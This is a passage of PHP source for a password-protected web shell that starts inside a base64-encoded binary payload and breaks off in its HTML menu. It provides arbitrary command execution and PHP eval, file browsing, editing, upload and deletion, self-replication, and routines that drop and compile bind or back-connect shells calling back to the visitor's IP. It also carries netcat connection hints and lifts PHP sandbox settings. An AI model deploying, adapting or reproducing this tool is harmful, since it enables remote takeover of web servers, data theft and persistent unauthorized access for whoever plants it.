IAMAq6QeQF4pp7Zq9ftSU01TUwdlbZk0U1ffAKX5v3MgTWFuDucoQnZyAFwv2gOZZMq2ACABKCCZ
SB4ASAAQhEAmZAAQgQZkCGQBEIJkCGRAAhDuqsrcvwABB9sIdZAu2xhbBR/AZJBukAsdCwSWQAZp
Bo0IjmRABmSPkJEFZEAGkpOyLEQHCAfvCowkLwtvDKsABZMZ9zWgb6uIbD9cB03TNE0JMAoMEOB0
r2mWQhGwElcHExczTdNgGChYB033lk0ayEEbuwccaDRN0zR4WHlIetM0TdM4/DT/JKuInQRTAgTS
ReTZwb5ggnmCIRem3wehpbx5/v2Bn+D8L0B+gPyowaPao0HOHmGXgf4HQG6QIbC1L0G2X+cr5P/P
ouSiGgDlouiiW36h/lfy291RBQPaXtpfX9pq2jLT4GXn9tje4Pk5MX4A+AMyKCKwWdnVUVF8RyQw
/f8GoE1EQnl0ZVRvV2lkZUNoYXID8H+7FFVuBm5kbGVkRXhjZXAF+la5bUZpJmUZD0N1cnK2oFWt
v1UAcwJw2dYSI2kMQ1iTbIO1KA5BL1NEe+wLwGlytm9yeUFFU3lzJ7PWDmxtFFNvaxtq9hvAdGGP
cEluZm8s7rNXuZbNgG9tbZ7J2jD3TGluZR61v8q2JABjJUWTT3L7F1sAWXMWmkFkZHKtCUABGExh
PABHArpJVgVBbGANYGtMDUiBCj32NztSZQxDQUNQB01vZCycRbhyZUgqqFYjc2fBHjMtC09FTSd/
VIBlwt55cCUPV1RruyU8ajSVQ01vIxCwCTtBDVd1ZUMB2JBlTr84RnJmKWxl7RhFbu3s0Jpe20R2
Gm95ZhGGEDZXxeUbrAEUelvDZBIxey82DY3PTzZ7SZgEUIYYCc1QbnxSdGxgd2m8YfA0G7F0ypGJ
AENw2Iy4ZnNlYGJPsDPiFjtTQ2xBDyPYjFkiZAw5CFgymnGGIRrbBfZRDkPlbIYtxF4Cn3RjaFvp
ZzYLmKMO7B+GHMu2aballsz/AwI0FnfLsiwEAgENzlNBU9vmaAGIIQ4JAgj8lyctc4JQRUwBAwCJ
C5Q/jIj9h+AADwELAQb0J3Zy2R3UFQQQAEAAEA+2YRNiEgcXYOxsFkyiDBAHy73sDQYAaESDR0DW
DQii/B7WEBvBLhh0Oi6Q4LOQDTCY+mAuck2YdYaLJwlTA5pb7JRqQC4mJxwKUPKbkkFQwBO0RQAA
aMVvsyQAAAD/AAAAAAAAAAAAAABgvgBQQACNvgDA//9Xg83/6xCQkJCQkJCKBkaIB0cB23UHix6D
7vwR23LtuAEAAAAB23UHix6D7vwR2xHAAdtz73UJix6D7vwR23PkMcmD6ANyDcHgCIoGRoPw/3R0
icUB23UHix6D7vwR2xHJAdt1B4seg+78EdsRyXUgQQHbdQeLHoPu/BHbEckB23PvdQmLHoPu/BHb
c+SDwQKB/QDz//+D0QGNFC+D/fx2D4oCQogHR0l19+lj////kIsCg8IEiQeDxwSD6QR38QHP6Uz/
//9eife5cAAAAIoHRyzoPAF394A/A3XyiweKXwRmwegIwcAQhsQp+IDr6AHwiQeDxwWI2OLZjb4A
UAAAiwcJwHRFi18EjYQwAHAAAAHzUIPHCP+WUHAAAJWKB0cIwHTcifl5Bw+3B0dQR7lXSPKuVf+W
VHAAAAnAdAeJA4PDBOvY/5ZkcAAAi65YcAAAjb4A8P//uwAQAABQVGoEU1f/1Y2H5wEAAIAgf4Bg
KH9YUFRQU1f/1VhhjUQkgGoAOcR1+oPsgOnbof//AAAAAAAAAAAAAAAAAAAAAAAAAHyAAABQgAAA
AAAAAAAAAAAAAAAAiYAAAGyAAAAAAAAAAAAAAAAAAACWgAAAdIAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAoIAAAK6AAAC+gAAAzoAAANyAAADqgAAAAAAAAPiAAAAAAAAAcwAAgAAAAABLRVJORUwzMi5E
TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA
AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA
AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
$shell_style = "
<style type=\"text/css\">
*{
	font-family:Tahoma,Verdana,Arial;
	font-size:12px;
	line-height:20px;
}

form{
	margin:0 auto;
	text-align:center;
}

body{
	background:url('".$_SERVER['SCRIPT_NAME']."?img=bg') #333333;
	color:#ffffff;
	margin:0;
	padding:0;
}

input,textarea{
	background:url('".$_SERVER['SCRIPT_NAME']."?img=bg') #111111;
	height:24px;
	color:#ffffff;
	padding:1.5px 4px 0 4px;
	margin:2px 0;
	border:1px solid ".$shell_color.";
	border-bottom:4px solid ".$shell_color.";
	vertical-align:middle;
}

input:hover,textarea:hover{
	background:#0a0a0a;
}

a{
	color:#ffffff;
	text-decoration:none;
}

a:hover{
	border-bottom:1px solid #ffffff;
}

h1{
	font-size:17px;
	height:20px;
	padding:2px 8px;
	background:".$shell_color.";
	border:0;
	border-left:4px solid ".$shell_color.";
	border-right:4px solid ".$shell_color.";
	border-bottom:1px solid #222222;
	margin:0 auto;
	width:90%;
}

h1 img{
	vertical-align:bottom;
}

.box{
	margin:0 auto;
	background:#000000;
	border:4px solid ".$shell_color.";
	padding:4px 8px;
	width:90%;
	text-align:justify;
}

.gaul{
	color:".$shell_color.";
}



.result, .boxcode{
	margin:0 auto;
	border:1px solid ".$shell_color.";
	font-family:Lucida Console,Tahoma,Verdana;
	padding:8px;
	text-align:justify;
	overflow:hidden;
	color:#ffffff;
}


#explorer, table{
	width:100%;
}

table th{
	border-bottom:1px solid ".$shell_color.";
	background:#111111;
	padding:4px;
}

table td{
	padding:4px;
	border-bottom:1px solid #111111;
	vertical-align:top;
}

.tblExplorer tr:hover, .hexview td:hover{
	background:".$shell_color.";
}


.hidden{
	display:none;
}
.tblbox td  {
	margin:0;
	padding:0;
	border-bottom:1px solid #222222;
}

.tblbox tr:hover{
	background:none;
}

#mainwrapper{
	width:100%;
	margin:20px auto;
	text-align:center;
}
#wrapper{
	width:90%;
	margin:auto;

}

.cmdbox{
	border-top:1px solid ".$shell_color.";
	border-bottom:1px solid ".$shell_color.";
	margin:4px 0;
	width:100%;
}

.fpath{
	border-top:1px solid ".$shell_color.";
	border-bottom:1px solid ".$shell_color.";
	margin:4px 0;
	padding:4px 0;
}

.fprop{
	border-top:1px solid ".$shell_color.";
	border-bottom:1px solid ".$shell_color.";
	margin:4px 0;
	padding:4px 0;
}


.bottomwrapper{
	text-align:center;
}

.btn{
	height:24px;
	background:url('".$_SERVER['SCRIPT_NAME']."?img=bg') #111111;
	font-size:10px;
	text-align:right;
}

.hexview , .hexview td{
	font-family: Lucida Console,Tahoma;
}
</style>
";
//################# FUNCTION GOES HERE #######################==============================================]
function xclean($text){
	if (get_magic_quotes_gpc()) {
		 $text = stripslashes($text);
	}
	return $text;
}
function xcleanpath($path){
	if(is_dir($path)){
		$path = urldecode(trim(xclean($path)));
		$xSlash = DIRECTORY_SEPARATOR;
		while(substr($path,-1) == $xSlash){
			$path = rtrim($path,$xSlash);
		}
		return $path.$xSlash;
	}
	return $path;
}
function xparsedir($dir){
	$xSlash = DIRECTORY_SEPARATOR;
	$dirs = explode($xSlash,$dir);
	$buff = "";
	$dlink = "";
	$system = trim(php_uname());
	if(strtolower(substr($system,0,3)) != "win") {
		$dlink .= urlencode($xSlash);
		$buff .= "<a href=\"?dir=".$dlink."\">".$xSlash."</a>&nbsp;";
	}
	foreach($dirs as $d){
		$d = trim($d);
		if($d != ""){
			$dlink .= urlencode($d.$xSlash);
			$buff .= "<a href=\"?dir=".$dlink."\">".$d." ".$xSlash."</a>&nbsp;";
		}
	}
	return "<span class=\"gaul\">[ </span>".$buff."<span class=\"gaul\"> ]</span>";
}
function xfileopen($file){
	$content = "";
	if(is_file($file) || is_link($file)){
		if($fp = fopen($file,"rb")){
			while(!feof($fp)) {
				$content .= fread($fp,1024);
			}
			fclose($fp);
		}
	}
	return $content;
}
function xfilesave($file,$content){
	$dir = substr($file,0,strrpos($file,DIRECTORY_SEPARATOR));
	if(!is_dir($dir)) mkdir($dir);
	if($file != ""){
		$handle = fopen($file, "wb");
		if(fwrite($handle, $content) || ($content == "")){
			fclose($handle);
			return true;
		}
		fclose($handle);
	}
	return false;
}
function xtempfolder() {
    if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
    if (!empty($_ENV['TMPDIR'])) { return realpath( $_ENV['TMPDIR']); }
    if (!empty($_ENV['TEMP'])) { return realpath( $_ENV['TEMP']); }
    $tempfile=tempnam(__FILE__,'');
    if (file_exists($tempfile)) {
      unlink($tempfile);
      return realpath(dirname($tempfile));
    }
    return null;
}
function xrmdir($dir) {
    $files = glob($dir . '*', GLOB_MARK);
    foreach( $files as $f ){
		if(is_dir($f)) xrmdir($f);
		else unlink($f);
	}
    if (is_dir($dir)) rmdir($dir);
}
function xhighlight($file){
	$color_bg = ini_get('highlight.bg');
	$color_html = ini_get('highlight.html');
	$color_keyword = ini_get('highlight.keyword');
	$color_default = ini_get('highlight.default');
	$color_comment = ini_get('highlight.comment');
	$color_string = ini_get('highlight.string');
	$con = @highlight_file($file,true);
	$con = str_ireplace($color_keyword,"#FF0082",$con);
	$con = str_ireplace($color_default,"#F00000",$con);
	$con = str_ireplace($color_string,"#888888",$con);
	$con = str_ireplace($color_html,"#EEEEEE",$con);
	return $con;
}
function xfilesummary($file){
	$buff = "";
	if(is_file($file) || is_link($file)){
		$buff = "Filesize : ".xparsefilesize(xfilesize($file))." ( ".xfilesize($file)." ) <span class=\"gaul\"> :: </span>Permission : ".xfileperms($file)." ( ".xfileowner($file)." )<span class=\"gaul\"> :: </span>modified : ".xfilelastmodified($file);
	}
	return $buff;
}
function xparsefilesize($size){
	if($size <= 1024) return $size;
	else{
		if($size <= 1024*1024) {
			$size = sprintf("%.02f",@round($size / 1024,2));
			return $size." kb";
		}
		else {
			$size = sprintf("%.02f",@round($size / 1024 / 1024,2));
			return $size." mb";
		}
	}
}
function xfilesize($file){
	if(is_file($file) || is_link($file)){
		if($size = filesize($file)){
			return $size;
		}
	}
	return "0";
}
function xfileperms($file){
	$isreadable = "-";
	$iswriteable = "-";
	if(is_file($file) || is_dir($file) || is_link($file)){
		if(is_readable($file)) $isreadable = "r";
		if(is_writeable($file)) $iswriteable = "w";
	}
	return $isreadable . " / " . $iswriteable;
}
function xfileowner($file){
	if(is_file($file) || is_dir($file) || is_link($file)){
		$fowner = fileowner($file);
		$fgroup = filegroup($file);
		if(function_exists('posix_getpwuid') && (function_exists('posix_getgrgid'))) {
				$name=posix_getpwuid($fowner);
				$group=posix_getgrgid($fgroup);
				return trim($name['name'].":".$group['name']);
		}
		else{
			return "???";
		}
	}
	return "???";
}
function xdrive(){
	$letters = "";
	foreach (range("A","Z") as $letter){
		$bool = @is_dir($letter.":\\");
		if($bool){
			$letters .= "<a href=\"?dir=".$letter.":\\\"><span class=\"gaul\">[ </span>";
			$letters .= $letter;
			$letters .= "<span class=\"gaul\"> ]</span</a> ";
		}
	}
	if($letters != "") $letters .= "<br />";
	return $letters;
}
function xfilelastmodified($file){
	if(is_file($file) || is_dir($file) || is_link($file)){
		$lastm = date("d-M-Y H:i",filemtime($file));
		return $lastm;
	}
	return "???";
}
function xrunexploit($fpath,$base64,$port,$type){
	$con = base64_decode($base64);
	$system = trim(php_uname());
	$final = "";
	if(preg_match("/win/i",$system)){
		$fname = "bd.exe";
		$ip = "";
		$ok = false;
		$fpath = $fpath.$fname;
		if(is_file($fpath)) unlink($fpath);
		if(!xfilesave($fpath,$con)){
			$tmp = xcleanpath(xtempfolder());
			$fpath = $tmp.$fname;
			if(xfilesave($fpath,$con)) $ok = true;
		}
		else $ok = true;
		if($ok){
			$fpath = trim($fpath);
			if($type == 'connect') $ip = $_SERVER['REMOTE_ADDR'];
			$final .= $fpath." ".$port." ".$ip;
			ekse(trim($final));
			return true;
		}
	}
	else {
		if($type == 'connect') $fname = "back";
		else $fname = "bind";
		$ip = "";
		$ok = false;
		$fpath = $fpath.$fname;
		if(is_file($fpath.".c")) unlink($fpath.".c");
		if(!xfilesave($fpath.".c",$con)){
			$tmp = xcleanpath(xtempfolder());
			$fpath = $tmp.$fname;
			if(xfilesave($fpath.".c",$con)) $ok = true;
		}
		else $ok = true;
		if($ok){
			$fpath = trim($fpath);
			if($type == 'connect') $ip = $_SERVER['REMOTE_ADDR'];
			ekse("gcc ".$fpath.".c -o ".$fpath);
			ekse("chmod +x ".$fpath);
			if(is_file($fpath)){
				$final .= $fpath." ".$port." ".$ip;
				ekse(trim($final));
				return true;
			}
			else return false;
		}
	}
	return false;
}
function xeval($code){
	$code = xclean($code);
	@ob_start();
	@eval($code);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
}
function ekse($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}
function xdir($path){
	$path = trim($path);
	$path = xcleanpath($path);
	if(is_dir($path)){
		$fname = array();
		$dname = array();
		if($dh = @scandir($path)){
			foreach($dh as $file){
				if(is_dir($file)){
					$dname[] = $file;
				}
				else{
					$fname[] = $file;
				}
			}
		}
		else{
			if($dh = @opendir($path)){
				while($file = @readdir($dh)){
					if(@is_dir($file)){
						$dname[] = $file;
					}
					else{
						$fname[] = $file;
					}
				}
				@closedir($dh);
			}
		}
		natcasesort($fname);
		natcasesort($dname);
		$buff = "<div id=\"explorer\"><table class=\"tblExplorer\">
		<tr><th>Filename</th>
		<th style=\"width:80px;\">Filesize</th>
		<th style=\"width:80px;\">Permission</th>
		<th style=\"width:150px;\">Last Modified</th>
		<th style=\"width:180px;\">Action</th></tr>";
		foreach($dname as $d){
			$sd = $d;
			if($d == "..") {
				$nextdir = "..".DIRECTORY_SEPARATOR."..";
				$d = xcleanpath(realpath($sd));
			}
			elseif($d == ".") {
				$nextdir = "..";
				$d = xcleanpath(realpath($sd));
			}
			else {
				$nextdir = ".";
				$d = xcleanpath(realpath(".".DIRECTORY_SEPARATOR.$sd));
			}
			$dir = $d;
			$nextdir = xcleanpath(realpath($nextdir));
			$buff .= "<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=".urlencode($d)."';\">
			<td><span style=\"font-weight:bold;\"><a href=\"?dir=".$dir."\">[</span> ".$sd." <span style=\"font-weight:bold;\">]</span></a></td>";
			$buff .= "<td>DIR</td>";
			$buff .= "<td style=\"text-align:center;\">".xfileperms($d)."</td>";
			$buff .= "<td style=\"text-align:center;\">".xfilelastmodified($d)."</td>";
			$buff .= "<td style=\"text-align:center;\"><a href=\"?dir=".$dir."&properties=".xcleanpath(realpath($d))."\">Properties</a> | <a href=\"?dir=".$nextdir."&del=".xcleanpath(realpath($d))."\">Remove</a></td>";
			$buff .= "</tr>";
		}
		foreach($fname as $f){
			$sf = $f;
			$f = $path.$f;
			$view = "?dir=".urlencode($path)."&view=".urlencode($f);
			$buff .= "<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location='?dir=".urlencode(xcleanpath($path))."&properties=".urlencode($f)."';\"><td>
			<a href=\"?dir=".urlencode(xcleanpath($path))."&properties=".urlencode($f)."\">
			".$sf."</a></td>";
			$buff .= "<td>".xparsefilesize(xfilesize($f))."</td>";
			$buff .= "<td style=\"text-align:center;\">".xfileperms($f)."</td>";
			$buff .= "<td style=\"text-align:center;\">".xfilelastmodified($f)."</td>";
			$buff .= "<td style=\"text-align:center;\"><a href=\"".$view."\">Edit</a> | <a href=\"?get=".$f."\">Download</a> | <a href=\"?dir=".xcleanpath($path)."&del=".$f."\">Remove</a></td>";
			$buff .= "</tr>";
		}
		$buff .= "</table></div>";
		return $buff;
	}
}
//################# INIT GOES HERE #######################==================================================]
error_reporting(0);
@set_time_limit(0);
ini_set("allow_url_fopen" ,1);
ini_set("allow_url_include" ,1);
ini_set("open_basedir",NULL);


if(isset($_POST['passw'])){
	$check = trim($_POST['passw']);
	if($check == $shell_password){
	setcookie("pass",$check,time() + 3600*24*7);
	$m = $_SERVER['SCRIPT_NAME'];
	header("Location: ".$m);
	die();
	}
	else setcookie("pass",$check,time() - 3600*24*7);
}
if(isset($_COOKIE['pass'])) $check = trim($_COOKIE['pass']);
else $check = "";
if($check == $shell_password){
 $auth = true;
 }
else $auth = false;
if(isset($_GET['img'])){
	$file = xclean($_GET['img']);
	if(is_file($file)){
		@ob_clean();
		$inf = getimagesize($file);
   		$ext = explode(basename($file),".");
   		$ext = $ext[count($ext)-1];
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public");
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  		@header("Cache-control: max-age=".(60*60*24*7));
   	 	@readfile($file);
		exit;
	}
	else{
		$file = $$file;
		$data = base64_decode($file);
		@header("Content-type: image/png");
		@header("Cache-control: public");
		echo $data;
		exit;
	}
}
if(isset($_GET['get']) && ($_GET['get'] != "")){
	$file = xclean($_GET['get']);
	$filez = @file_get_contents($file);
	header("Content-type: application/octet-stream");
	header("Content-length: ".strlen($filez));
	header("Content-disposition: attachment; filename=\"".basename($file)."\";");
	echo $filez;
	exit;
}
$xCwd = xcleanpath(getcwd());
if(isset($_GET['btnConnect']) && (is_numeric($_GET['bportC']))){
	$port = $_GET['bportC'];
	$dir = xcleanpath(xclean(trim($_GET['dir'])));
	$system = trim(php_uname());
	if(strtolower(substr($system,0,3)) == "win") $base64 = $wBind;
	else $base64 = $xBack;
	if(xrunexploit($dir,$base64,$port,"connect")){
	}
}
elseif(isset($_GET['btnListen']) && (is_numeric($_GET['lportC']))){
	$port = $_GET['lportC'];
	$dir = xcleanpath(xclean(trim($_GET['dir'])));
	$system = trim(php_uname());
	if(strtolower(substr($system,0,3)) == "win") $base64 = $wBind;
	else $base64 = $xBind;
	if(xrunexploit($dir,$base64,$port,"listen")){
	}
}
if(isset($_GET['dir']) && ($_GET['dir'] != "")){
	$newdir = xcleanpath(xclean(trim($_GET['dir'])));
	if(isset($_GET['oldfilename']) && ($_GET['oldfilename'] != "")){
		$newdir = xcleanpath(xclean(trim($_GET['properties'])));
	}
	if(is_dir($newdir)){
		if(chdir($newdir)) $xCwd = $newdir;
	}
	else{
		$newdir = dirname($newdir);
		if(is_dir($newdir)) if(chdir($newdir)) $xCwd = $newdir;
	}
	if(isset($_POST['btnNewUploadUrl'])){
		$filename = xclean(trim($_POST['filename']));
		$fileurl = xclean(trim($_POST['fileurl']));
		if($filename == "") $filename = basename($fileurl);
		$filepath = $newdir.$filename;
		if($fileurl != ""){
			$con = xfileopen($fileurl);
			xfilesave($filepath,$con);
		}
	}
	elseif(isset($_POST['btnNewUploadLocal'])){
		if(is_uploaded_file($_FILES['filelocal']['tmp_name'])){
			$filename = xclean(trim($_POST['filename']));
			if($filename == "") $filename = $_FILES['filelocal']['name'];
			$tmp_name = $_FILES['filelocal']['tmp_name'];
			$filepath = $newdir.$filename;
			$stat = @move_uploaded_file($tmp_name,$filepath);
		}
	}
	if(isset($_GET['foldername']) && ($_GET['foldername'] != "")){
		$fname = xcleanpath(xclean(trim($_GET['foldername'])));
		if(!is_dir($newdir.$fname))	mkdir($newdir.$fname);
	}
	elseif(isset($_GET['del']) && ($_GET['del'] != "")){
		$fdel = xclean(trim($_GET['del']));
		if(is_file($fdel) || is_link($fdel)) unlink($fdel);
		elseif(is_dir($fdel)){
			xrmdir($fdel);
			$newdir = substr($newdir,0,strrpos($newdir,DIRECTORY_SEPARATOR));
			$newdir = substr($newdir,0,strrpos($newdir,DIRECTORY_SEPARATOR));
		}
	}
	elseif(isset($_GET['childname']) && ($_GET['childname'] != "")){
		$childname = $newdir.xclean(trim($_GET['childname']));
		$con = xfileopen($_SERVER['SCRIPT_FILENAME']);
		xfilesave($childname,$con);
	}
}
if(isset($_GET['cmd']) && ($_GET['cmd'] != "")){
	$cmd = xclean($_GET['cmd']);
	if(preg_match("/^cd(.*)/i",$cmd,$c)){
		$newdir = trim($c[1]);
		$newdir = trim(urldecode(xclean($newdir)));
		if($newdir == "\\")	$xCwd = substr($xCwd,0,3);
		else{
			if(strpos($newdir,":") > 0){
				if(is_dir($newdir))	$xCwd = xcleanpath(realpath($newdir));
			}
			elseif(is_dir($newdir)){
				$xCwd = xcleanpath(realpath($newdir));
			}
			else{
				if(is_dir($xCwd.$newdir)) $xCwd = xcleanpath(realpath($xCwd.$newdir));
			}
		}
		$result = xdir($xCwd);
	}
	elseif(preg_match("/^(\w{1}:.*)/",$cmd,$dc)){
		$newdir = trim($dc[1]);
		if(is_dir($newdir)){
			$xCwd = xcleanpath($newdir);
		}
		$result = xdir($xCwd);
	}
	else {
		$result = ekse($cmd);
		if($result != "") $result = nl2br(str_replace(" ","&nbsp;",htmlentities($result)));
		else {
			$result = xdir($xCwd);
		}
	}

}
elseif(isset($_GET['eval']) && ($_GET['eval'] != "")){
	$result = htmlspecialchars(xeval($_GET['eval']));
}
elseif(isset($_GET['properties']) && ($_GET['properties'] != "")){
	$fname = xcleanpath(xclean($_GET['properties']));
	if(isset($_GET['oldfilename']) && ($_GET['oldfilename'] != "")){
		$oldname = xclean($_GET['oldfilename']);
		rename($oldname,$fname);
	}
	$dir = xclean($_GET['dir']);
	$fcont = "";
	$fview = "";
	if(is_dir($fname)){
		$fsize = "DIR";
		$fcont = xdir($fname);
		$faction = "<a href=\"?dir=".xcleanpath(realpath($fname))."&properties=".xcleanpath(realpath($fname))."\">Properties</a> | <a href=\"?dir=".xcleanpath(realpath($fname.".."))."&del=".xcleanpath(realpath($fname))."\">Remove</a>";
	}
	else{
		$fname = rtrim($fname,DIRECTORY_SEPARATOR);
		$fsize = xparsefilesize(xfilesize($fname))." <span class=\"gaul\">( </span>".xfilesize($fname)." bytes<span class=\"gaul\"> )</span>";
		$type = "";
		if(isset($_GET['type'])) $type = trim(xclean($_GET['type']));
		$iinfo = getimagesize($fname);
		$imginfo = "";
		if($type == ""){
			if(is_array($iinfo)) $type = 'img';
			else $type = 'text';
		}
		if($type == 'code'){
			if($code = xhighlight($fname))
			$fcont = "<div class=\"boxcode\">".$code."</div>";
		}
		elseif($type == 'img'){
			$width = (int) $iinfo[0];
			$height = (int) $iinfo[1];
			$imginfo = "Image type = ( ".$iinfo['mime']." )<br />Image Size = <span class=\"gaul\">( </span>".$width." x ".$height."<span class=\"gaul\"> )</span><br />";
			if($width > 800){
				$width = 800;
				$imglink = "<p><a href=\"?img=".$fname."\" target=\"_blank\"><span class=\"gaul\">[ </span>view full size<span class=\"gaul\"> ]</span></a></p>";
			}
			else $imglink = "";

			$fcont = "<div style=\"text-align:center;width:100%;\">".$imglink."<img width=\"".$width."\" src=\"?img=".$fname."\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>";
		}
		else{
			$code = htmlspecialchars(file_get_contents($fname));
			$fcont = "<div class=\"boxcode\">".nl2br($code)."</div>";
		}
		$faction = "<a href=\"?dir=".xcleanpath($dir)."&view=".$fname."\">Edit</a> | <a href=\"?get=".$fname."\">Download</a> | <a href=\"?dir=".xcleanpath($dir)."&del=".$fname."\">Remove</a>";
		$fview = "<a href=\"?dir=".xcleanpath($dir)."&properties=".$fname."&type=text\"><span class=\"gaul\">[ </span>text<span class=\"gaul\"> ]</span></a><a href=\"?dir=".xcleanpath($dir)."&properties=".$fname."&type=code\"><span class=\"gaul\">[ </span>code<span class=\"gaul\"> ]</span></a><a href=\"?dir=".xcleanpath($dir)."&properties=".$fname."&type=img\"><span class=\"gaul\">[ </span>image<span class=\"gaul\"> ]</span></a>";
	}
	$fowner = xfileowner($fname);
	$fperm = xfileperms($fname);
	$result = "<div style=\"display:inline;\">
	<form action=\"?\" method=\"get\" style=\"margin:0;padding:1px 8px;text-align:left;\">
	<input type=\"hidden\" name=\"dir\" value=\"".$dir."\" />
	<input type=\"hidden\" name=\"oldfilename\" value=\"".$fname."\" />".$faction." |
	<span><input style=\"width:50%;\" type=\"text\" name=\"properties\" value=\"".$fname."\" />
	<input style=\"width:120px\" class=\"btn\" type=\"submit\" name=\"btnRename\" value=\"Rename\" />
	</span>
	<div class=\"fprop\">
	Size = ".$fsize."<br />".$imginfo."
	Owner = <span class=\"gaul\">( </span>".$fowner."<span class=\"gaul\"> )</span><br />
	Permission = <span class=\"gaul\">( </span>".$fperm."<span class=\"gaul\"> )</span><br />
	Create Time = <span class=\"gaul\">( </span>".date("d-M-Y H:i",@filectime($fname))."<span class=\"gaul\"> )</span><br />
	Last Modified = <span class=\"gaul\">( </span>".date("d-M-Y H:i",@filemtime($fname))."<span class=\"gaul\"> )</span><br />
	Last Accessed = <span class=\"gaul\">( </span>".date("d-M-Y H:i",@fileatime($fname))."<span class=\"gaul\"> )</span><br />
	".$fview."
	</div>
	".$fcont."
	</form>
	</div>
	";
}
elseif((isset($_GET['view']) && ($_GET['view'] != "")) || ((isset($_GET['filename']) && ($_GET['filename'] != "")))){
	$msg = "";
	if(isset($_POST['save']) && ($_POST['save'] == "Save As")){
		$file = xclean(trim($_POST['saveAs']));
		$content = xclean($_POST['filesource']);
		if(xfilesave($file,$content)) $pesan = "File Saved";
		else  $pesan = "Failed to save file";
		$msg = "<span style=\"float:right;\"><span class=\"gaul\">[ </span>".$pesan."<span class=\"gaul\"> ]</span></span>";
	}
	else {
		if(isset($_GET['view']) && ($_GET['view'] != "")) $file = xclean(trim($_GET['view']));
		else $file = $xCwd.xclean(trim($_GET['filename']));
	}
	$result = xfileopen($file);
	$result = htmlentities($result);
	$result = "
	<p style=\"padding:0;margin:0;text-align:left;\"><a href=\"?dir=".$xCwd."&properties=".$file."\">".xfilesummary($file)."</a>".$msg."</p><div style=\"clear:both;margin:0;padding:0;\"></div>
	<form action=\"?dir=".$xCwd."&view=".$file."\" method=\"post\">
<textarea name=\"filesource\" style=\"width:100%;height:200px;\">".$result."</textarea>
	<input type=\"text\" style=\"width:80%;\"  name=\"saveAs\" value=\"".$file."\" />
	<input type=\"submit\" class=\"btn\" style=\"width:120px;\" name=\"save\" value=\"Save As\" />
	</form>
	";
}
else{
	$result = xdir($xCwd);
}
//################# Finalizing #######################======================================================]
if($auth){
	if(isset($_GET['bportC'])) $bportC = $_GET['bportC'];
	else $bportC = $shell_fav_port;
	if(isset($_GET['lportC'])) $lportC = $_GET['lportC'];
	else $lportC = $shell_fav_port;
	$html_title = $shell_title." ".$xCwd;
	$html_head = "
<title>".$html_title."</title>
<link rel=\"SHORTCUT ICON\" href=\"".$_SERVER['SCRIPT_NAME']."?img=icon\" />
".$shell_style."
<script type=\"text/javascript\">
function updateInfo(boxid,typ){
	if(typ == 0){
		var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';
	}
	else{
		var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc ".$xServerIP." __PORT__&quot;';
	}

	var portnum = document.getElementById(boxid).value;

	var hasil = pola.replace('__PORT__', portnum);
	document.getElementById(boxid+'_').innerHTML = hasil;
}
function show(boxid){
	var box = document.getElementById(boxid);
	if(box.style.display != 'inline'){
		document.getElementById('newfile').style.display = 'none';
		document.getElementById('newfolder').style.display = 'none';
		document.getElementById('newupload').style.display = 'none';
		document.getElementById('newchild').style.display = 'none';
		document.getElementById('newconnect').style.display = 'none';
		document.getElementById('div_eval').style.display = 'none';

		box.style.display = 'inline';
		box.focus();
	}
	else box.style.display = 'none';
}
function highlighthexdump(address){
	var target = document.getElementById(address);
	target.style.background = '".$shell_color."';
}
function unhighlighthexdump(address){
	var target = document.getElementById(address);
	target.style.background = 'none';
}
</script>
";
$html_body = "
<div id=\"wrapper\">
<h1 onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\"  onclick=\"window.location= '?';\"><a href=\"?\">".$shell_title."</a></h1>
<div class=\"box\">".$xHeader."
<div class=\"fpath\">
".xdrive().xparsedir($xCwd)."
</div>
<div class=\"menu\">
<a href=\"javascript:show('newfile');\"><span class=\"gaul\">[ </span> New File<span class=\"gaul\"> ]</span></a>
<a href=\"javascript:show('newfolder');\"><span class=\"gaul\">[ </span>New Folder<span class=\"gaul\"> ]</span></a>
<a href=\"javascript:show('newchild');\"><span class=\"gaul\">[ </span>Replicate<span class=\"gaul\"> ]</span></a>
<a href=\"javascript:show('newupload');\"><span class=\"gaul\">[ </span>Upload<span class=\"gaul\"> ]</span></a>
<a href=\"javascript:show('newconnect');\"><span class=\"gaul\">[ </span>BindShell<span class=\"gaul\"> ]</span></a>
<a href=\"javascript:show('div_eval');\"><span class=\"gaul\">[ </span>PHP Eval<span class=\"gaul\"> ]</span></a>
</div>
<div class=\"hidden\" id=\"newconnect\">
